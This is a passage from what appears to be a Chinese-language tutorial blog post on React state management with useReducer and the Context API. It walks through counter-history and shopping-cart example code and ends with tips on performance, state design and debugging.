      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{increment}</span>&gt;</span>+1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{decrement}</span>&gt;</span>-1<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">{reset}</span>&gt;</span>重置<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{undo}</span> 
        <span class="hljs-attr">disabled</span>=<span class="hljs-string">{state.isUndoDisabled}</span>
        <span class="hljs-attr">title</span>=<span class="hljs-string">"撤销"</span>
      &gt;</span>
        ↶
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
        <span class="hljs-attr">onClick</span>=<span class="hljs-string">{redo}</span> 
        <span class="hljs-attr">disabled</span>=<span class="hljs-string">{state.isRedoDisabled}</span>
        <span class="hljs-attr">title</span>=<span class="hljs-string">"重做"</span>
      &gt;</span>
        ↷
      <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">CounterControls</span>;

<span class="hljs-comment">// src/components/CounterHistory.js</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { useCounter } <span class="hljs-keyword">from</span> <span class="hljs-string">'../contexts/CounterContext'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">CounterHistory</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> { state, setCount } = <span class="hljs-title function_">useCounter</span>();
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"counter-history"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>计数历史<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"history-list"</span>&gt;</span>
        {state.history.map((count, index) =&gt; (
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
            <span class="hljs-attr">key</span>=<span class="hljs-string">{index}</span>
            <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">history-item</span> ${<span class="hljs-attr">index</span> === <span class="hljs-string">state.currentIndex</span> ? '<span class="hljs-attr">active</span>' <span class="hljs-attr">:</span> ''}`}
            <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> setCount(count)}
          &gt;
            {count}
          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        ))}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">CounterHistory</span>;
</code></pre>
<h3 data-id="heading-9">🎯 进阶实现：购物车应用</h3>
<p>让我们通过一个更复杂的购物车应用，展示这个状态管理方案的强大功能。</p>
<h4 data-id="heading-10">1. 创建购物车状态管理</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/contexts/CartContext.js</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span>, { createContext, useContext, useReducer } <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;

<span class="hljs-comment">// 定义初始状态</span>
<span class="hljs-keyword">const</span> initialState = {
  <span class="hljs-attr">items</span>: [],
  <span class="hljs-attr">totalItems</span>: <span class="hljs-number">0</span>,
  <span class="hljs-attr">totalPrice</span>: <span class="hljs-number">0</span>
};

<span class="hljs-comment">// 定义action类型</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">ActionTypes</span> = {
  <span class="hljs-attr">ADD_ITEM</span>: <span class="hljs-string">'ADD_ITEM'</span>,
  <span class="hljs-attr">REMOVE_ITEM</span>: <span class="hljs-string">'REMOVE_ITEM'</span>,
  <span class="hljs-attr">UPDATE_QUANTITY</span>: <span class="hljs-string">'UPDATE_QUANTITY'</span>,
  <span class="hljs-attr">CLEAR_CART</span>: <span class="hljs-string">'CLEAR_CART'</span>,
  <span class="hljs-attr">TOGGLE_ITEM_SELECTION</span>: <span class="hljs-string">'TOGGLE_ITEM_SELECTION'</span>,
  <span class="hljs-attr">SELECT_ALL_ITEMS</span>: <span class="hljs-string">'SELECT_ALL_ITEMS'</span>
};

<span class="hljs-comment">// 创建reducer函数</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">cartReducer</span> = (<span class="hljs-params">state, action</span>) =&gt; {
  <span class="hljs-keyword">switch</span> (action.<span class="hljs-property">type</span>) {
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">ADD_ITEM</span>: {
      <span class="hljs-keyword">const</span> { product, quantity = <span class="hljs-number">1</span> } = action.<span class="hljs-property">payload</span>;
      <span class="hljs-keyword">const</span> existingItemIndex = state.<span class="hljs-property">items</span>.<span class="hljs-title function_">findIndex</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">product</span>.<span class="hljs-property">id</span> === product.<span class="hljs-property">id</span>);
      
      <span class="hljs-keyword">let</span> newItems;
      <span class="hljs-keyword">if</span> (existingItemIndex &gt;= <span class="hljs-number">0</span>) {
        <span class="hljs-comment">// 商品已存在，更新数量</span>
        newItems = [...state.<span class="hljs-property">items</span>];
        newItems[existingItemIndex] = {
          ...newItems[existingItemIndex],
          <span class="hljs-attr">quantity</span>: newItems[existingItemIndex].<span class="hljs-property">quantity</span> + quantity
        };
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// 新商品，添加到购物车</span>
        newItems = [...state.<span class="hljs-property">items</span>, { product, quantity, <span class="hljs-attr">selected</span>: <span class="hljs-literal">true</span> }];
      }
      
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">calculateTotals</span>(newItems);
    }
    
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">REMOVE_ITEM</span>: {
      <span class="hljs-keyword">const</span> newItems = state.<span class="hljs-property">items</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">product</span>.<span class="hljs-property">id</span> !== action.<span class="hljs-property">payload</span>);
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">calculateTotals</span>(newItems);
    }
    
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">UPDATE_QUANTITY</span>: {
      <span class="hljs-keyword">const</span> { productId, quantity } = action.<span class="hljs-property">payload</span>;
      <span class="hljs-keyword">if</span> (quantity &lt;= <span class="hljs-number">0</span>) {
        <span class="hljs-keyword">return</span> state;
      }
      
      <span class="hljs-keyword">const</span> newItems = state.<span class="hljs-property">items</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> 
        item.<span class="hljs-property">product</span>.<span class="hljs-property">id</span> === productId 
          ? { ...item, quantity } 
          : item
      );
      
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">calculateTotals</span>(newItems);
    }
    
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">CLEAR_CART</span>: {
      <span class="hljs-keyword">return</span> initialState;
    }
    
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">TOGGLE_ITEM_SELECTION</span>: {
      <span class="hljs-keyword">const</span> newItems = state.<span class="hljs-property">items</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> 
        item.<span class="hljs-property">product</span>.<span class="hljs-property">id</span> === action.<span class="hljs-property">payload</span> 
          ? { ...item, <span class="hljs-attr">selected</span>: !item.<span class="hljs-property">selected</span> } 
          : item
      );
      
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">calculateTotals</span>(newItems);
    }
    
    <span class="hljs-keyword">case</span> <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">SELECT_ALL_ITEMS</span>: {
      <span class="hljs-keyword">const</span> { selected } = action.<span class="hljs-property">payload</span>;
      <span class="hljs-keyword">const</span> newItems = state.<span class="hljs-property">items</span>.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> ({ ...item, selected }));
      <span class="hljs-keyword">return</span> <span class="hljs-title function_">calculateTotals</span>(newItems);
    }
    
    <span class="hljs-attr">default</span>:
      <span class="hljs-keyword">return</span> state;
  }
};

<span class="hljs-comment">// 计算购物车总计</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">calculateTotals</span> = (<span class="hljs-params">items</span>) =&gt; {
  <span class="hljs-keyword">const</span> totalItems = items.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum, item</span>) =&gt;</span> sum + item.<span class="hljs-property">quantity</span>, <span class="hljs-number">0</span>);
  <span class="hljs-keyword">const</span> totalPrice = items.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum, item</span>) =&gt;</span> 
    sum + (item.<span class="hljs-property">selected</span> ? item.<span class="hljs-property">product</span>.<span class="hljs-property">price</span> * item.<span class="hljs-property">quantity</span> : <span class="hljs-number">0</span>), <span class="hljs-number">0</span>
  );
  
  <span class="hljs-keyword">return</span> {
    items,
    totalItems,
    totalPrice
  };
};

<span class="hljs-comment">// 创建Context</span>
<span class="hljs-keyword">const</span> <span class="hljs-title class_">CartContext</span> = <span class="hljs-title function_">createContext</span>(<span class="hljs-literal">null</span>);

<span class="hljs-comment">// 创建Provider组件</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">CartProvider</span> = (<span class="hljs-params">{ children }</span>) =&gt; {
  <span class="hljs-keyword">const</span> [state, dispatch] = <span class="hljs-title function_">useReducer</span>(cartReducer, initialState);
  
  <span class="hljs-comment">// 定义操作函数</span>
  <span class="hljs-keyword">const</span> actions = {
    <span class="hljs-attr">addItem</span>: <span class="hljs-function">(<span class="hljs-params">product, quantity = <span class="hljs-number">1</span></span>) =&gt;</span> 
      <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">ADD_ITEM</span>, <span class="hljs-attr">payload</span>: { product, quantity } }),
    
    <span class="hljs-attr">removeItem</span>: <span class="hljs-function">(<span class="hljs-params">productId</span>) =&gt;</span> 
      <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">REMOVE_ITEM</span>, <span class="hljs-attr">payload</span>: productId }),
    
    <span class="hljs-attr">updateQuantity</span>: <span class="hljs-function">(<span class="hljs-params">productId, quantity</span>) =&gt;</span> 
      <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">UPDATE_QUANTITY</span>, <span class="hljs-attr">payload</span>: { productId, quantity } }),
    
    <span class="hljs-attr">clearCart</span>: <span class="hljs-function">() =&gt;</span> 
      <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">CLEAR_CART</span> }),
    
    <span class="hljs-attr">toggleItemSelection</span>: <span class="hljs-function">(<span class="hljs-params">productId</span>) =&gt;</span> 
      <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">TOGGLE_ITEM_SELECTION</span>, <span class="hljs-attr">payload</span>: productId }),
    
    <span class="hljs-attr">selectAllItems</span>: <span class="hljs-function">(<span class="hljs-params">selected</span>) =&gt;</span> 
      <span class="hljs-title function_">dispatch</span>({ <span class="hljs-attr">type</span>: <span class="hljs-title class_">ActionTypes</span>.<span class="hljs-property">SELECT_ALL_ITEMS</span>, <span class="hljs-attr">payload</span>: { selected } })
  };
  
  <span class="hljs-comment">// 导出额外的计算属性</span>
  <span class="hljs-keyword">const</span> computed = {
    <span class="hljs-comment">// 获取选中的商品</span>
    <span class="hljs-attr">selectedItems</span>: state.<span class="hljs-property">items</span>.<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">selected</span>),
    <span class="hljs-comment">// 获取选中商品的数量</span>
    <span class="hljs-attr">selectedItemsCount</span>: state.<span class="hljs-property">items</span>.<span class="hljs-title function_">reduce</span>(<span class="hljs-function">(<span class="hljs-params">sum, item</span>) =&gt;</span> 
      sum + (item.<span class="hljs-property">selected</span> ? item.<span class="hljs-property">quantity</span> : <span class="hljs-number">0</span>), <span class="hljs-number">0</span>
    ),
    <span class="hljs-comment">// 是否全选</span>
    <span class="hljs-attr">isAllSelected</span>: state.<span class="hljs-property">items</span>.<span class="hljs-property">length</span> &gt; <span class="hljs-number">0</span> &amp;&amp; state.<span class="hljs-property">items</span>.<span class="hljs-title function_">every</span>(<span class="hljs-function"><span class="hljs-params">item</span> =&gt;</span> item.<span class="hljs-property">selected</span>)
  };
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">CartContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">state</span>, <span class="hljs-attr">...actions</span>, <span class="hljs-attr">...computed</span> }}&gt;</span>
      {children}
    <span class="hljs-tag">&lt;/<span class="hljs-name">CartContext.Provider</span>&gt;</span></span>
  );
};

<span class="hljs-comment">// 创建自定义Hook</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> <span class="hljs-title function_">useCart</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> context = <span class="hljs-title function_">useContext</span>(<span class="hljs-title class_">CartContext</span>);
  <span class="hljs-keyword">if</span> (!context) {
    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">'useCart must be used within a CartProvider'</span>);
  }
  <span class="hljs-keyword">return</span> context;
};
</code></pre>
<h4 data-id="heading-11">2. 商品列表组件</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/components/ProductList.js</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { useCart } <span class="hljs-keyword">from</span> <span class="hljs-string">'../contexts/CartContext'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">ProductList</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// 模拟商品数据</span>
  <span class="hljs-keyword">const</span> products = [
    { <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'React Hooks 实战'</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">89.99</span>, <span class="hljs-attr">category</span>: <span class="hljs-string">'书籍'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">2</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'JavaScript 高级程序设计'</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">99.99</span>, <span class="hljs-attr">category</span>: <span class="hljs-string">'书籍'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">3</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'前端工程化实践'</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">79.99</span>, <span class="hljs-attr">category</span>: <span class="hljs-string">'书籍'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">4</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'Vue.js 从入门到精通'</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">85.99</span>, <span class="hljs-attr">category</span>: <span class="hljs-string">'书籍'</span> },
    { <span class="hljs-attr">id</span>: <span class="hljs-number">5</span>, <span class="hljs-attr">name</span>: <span class="hljs-string">'TypeScript 权威指南'</span>, <span class="hljs-attr">price</span>: <span class="hljs-number">95.99</span>, <span class="hljs-attr">category</span>: <span class="hljs-string">'书籍'</span> }
  ];
  
  <span class="hljs-keyword">const</span> { addItem } = <span class="hljs-title function_">useCart</span>();
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"product-list"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>商品列表<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"products"</span>&gt;</span>
        {products.map(product =&gt; (
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{product.id}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"product-card"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>{product.name}<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"product-price"</span>&gt;</span>¥{product.price.toFixed(2)}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"product-category"</span>&gt;</span>{product.category}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
              <span class="hljs-attr">className</span>=<span class="hljs-string">"add-to-cart-btn"</span>
              <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> addItem(product, 1)}
            &gt;
              添加到购物车
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        ))}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">ProductList</span>;
</code></pre>
<h4 data-id="heading-12">3. 购物车组件</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// src/components/ShoppingCart.js</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">React</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'react'</span>;
<span class="hljs-keyword">import</span> { useCart } <span class="hljs-keyword">from</span> <span class="hljs-string">'../contexts/CartContext'</span>;

<span class="hljs-keyword">const</span> <span class="hljs-title function_">ShoppingCart</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">const</span> { 
    state, 
    removeItem, 
    updateQuantity, 
    clearCart, 
    toggleItemSelection,
    selectAllItems,
    isAllSelected,
    selectedItemsCount
  } = <span class="hljs-title function_">useCart</span>();
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"shopping-cart"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span>购物车 ({state.totalItems} 件商品)<span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
      
      {state.items.length === 0 ? (
        <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"empty-cart"</span>&gt;</span>购物车是空的<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      ) : (
        <span class="hljs-tag">&lt;&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"cart-header"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
              <span class="hljs-attr">className</span>=<span class="hljs-string">"select-all-btn"</span>
              <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> selectAllItems(!isAllSelected)}
            &gt;
              {isAllSelected ? '取消全选' : '全选'}
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
              <span class="hljs-attr">className</span>=<span class="hljs-string">"clear-cart-btn"</span>
              <span class="hljs-attr">onClick</span>=<span class="hljs-string">{clearCart}</span>
            &gt;</span>
              清空购物车
            <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"cart-items"</span>&gt;</span>
            {state.items.map(item =&gt; (
              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{item.product.id}</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"cart-item"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"item-select"</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
                    <span class="hljs-attr">type</span>=<span class="hljs-string">"checkbox"</span> 
                    <span class="hljs-attr">checked</span>=<span class="hljs-string">{item.selected}</span> 
                    <span class="hljs-attr">onChange</span>=<span class="hljs-string">{()</span> =&gt;</span> toggleItemSelection(item.product.id)}
                  /&gt;
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"item-info"</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>{item.product.name}<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"item-price"</span>&gt;</span>¥{item.product.price.toFixed(2)}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"item-quantity"</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
                    <span class="hljs-attr">className</span>=<span class="hljs-string">"quantity-btn"</span>
                    <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> updateQuantity(item.product.id, item.quantity - 1)}
                  &gt;
                    -
                  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>{item.quantity}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
                  <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
                    <span class="hljs-attr">className</span>=<span class="hljs-string">"quantity-btn"</span>
                    <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> updateQuantity(item.product.id, item.quantity + 1)}
                  &gt;
                    +
                  <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                
                <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"item-total"</span>&gt;</span>
                  ¥{(item.product.price * item.quantity).toFixed(2)}
                <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
                
                <span class="hljs-tag">&lt;<span class="hljs-name">button</span> 
                  <span class="hljs-attr">className</span>=<span class="hljs-string">"remove-btn"</span>
                  <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> removeItem(item.product.id)}
                &gt;
                  删除
                <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            ))}
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"cart-summary"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"summary-info"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>已选商品：{selectedItemsCount} 件<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>合计：<span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"total-price"</span>&gt;</span>¥{state.totalPrice.toFixed(2)}<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"checkout-btn"</span>&gt;</span>去结算<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/&gt;</span></span>
      )}
    &lt;/div&gt;
  );
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title class_">ShoppingCart</span>;
</code></pre>
<h3 data-id="heading-13">⚠️ 注意事项</h3>
<h4 data-id="heading-14">1. 性能优化</h4>
<ul>
<li><strong>避免不必要的重渲染</strong>：使用<code>React.memo</code>优化组件，避免因Context更新导致所有子组件重渲染</li>
<li><strong>拆分Context</strong>：根据功能将状态拆分为多个独立的Context，避免单一Context过大</li>
<li><strong>使用useMemo</strong>：在Provider中使用<code>useMemo</code>缓存值，避免不必要的Context值更新</li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 在Provider中使用useMemo优化</span>
<span class="hljs-keyword">const</span> value = <span class="hljs-title function_">useMemo</span>(<span class="hljs-function">() =&gt;</span> ({ state, ...actions }), [state, actions]);

<span class="hljs-keyword">return</span> (
  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">CounterContext.Provider</span> <span class="hljs-attr">value</span>=<span class="hljs-string">{value}</span>&gt;</span>
    {children}
  <span class="hljs-tag">&lt;/<span class="hljs-name">CounterContext.Provider</span>&gt;</span></span>
);
</code></pre>
<h4 data-id="heading-15">2. 状态设计原则</h4>
<ul>
<li><strong>单一数据源</strong>：每个状态最好只在一个地方管理</li>
<li><strong>不可变性</strong>：状态更新时应返回新的状态对象，而不是直接修改原状态</li>
<li><strong>合理拆分</strong>：将相关的状态和操作放在一起，避免单一reducer处理所有状态</li>
</ul>
<h4 data-id="heading-16">3. 调试技巧</h4>
<ul>
<li>使用React DevTools的Context选项卡查看Context值</li>
<li>在reducer函数中添加日志，跟踪状态更新过程</li>
<li>使用Redux DevTools Extension（需要额外配置）查看状态历史和action记录</li>
</ul>
<h4 data-id="heading-17">4. 应用场景</h4>
<p>这种轻量级状态管理方案适用于：</p>
<ul>
<li>中等规模的React应用</li>
<li>需要避免props drilling的组件树</li>
<li>多个组件共享同一份状态</li>
<li>不希望引入额外依赖的项目</li>
</ul>
<p>对于大型复杂应用，可能仍然需要使用专业的状态管理库（如Redux、MobX）。</p>
<h3 data-id="heading-18">📝 总结</h3>
<p>通过组合使用React内置的<code>useReducer</code>和<code>Context API</code>，我们可以实现一个轻量级、高效的状态管理方案：</p>
<ol>
<li><strong>避免props drilling</strong>：通过Context在组件树中直接共享状态</li>
<li><strong>集中管理状态</strong>：使用reducer函数统一处理状态更新逻辑</li>
<li><strong>简化组件间通信</strong>：组件可以直接获取和更新共享状态</li>
<li><strong>无需额外依赖</strong>：利用React内置功能，减少项目依赖</li>
<li><strong>良好的可维护性</strong>：状态逻辑与UI组件分离，便于测试和维护</li>
</ol>
<p>这种方案兼顾了简洁性和功能性，是中等规模React应用的理想选择。通过合理的状态设计和性能优化，我们可以构建出高效、可维护的前端应用。</p>
<p>希望这个小技巧对你有所帮助！如果你有任何问题或建议，欢迎在评论区留言讨论 🤗</p>
<hr/>
<p><strong>相关资源：</strong></p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Freact.dev%2Freference%2Freact%2FuseReducer" target="_blank" title="https://react.dev/reference/react/useReducer" ref="nofollow noopener noreferrer">React 官方文档 - useReducer</a></li>
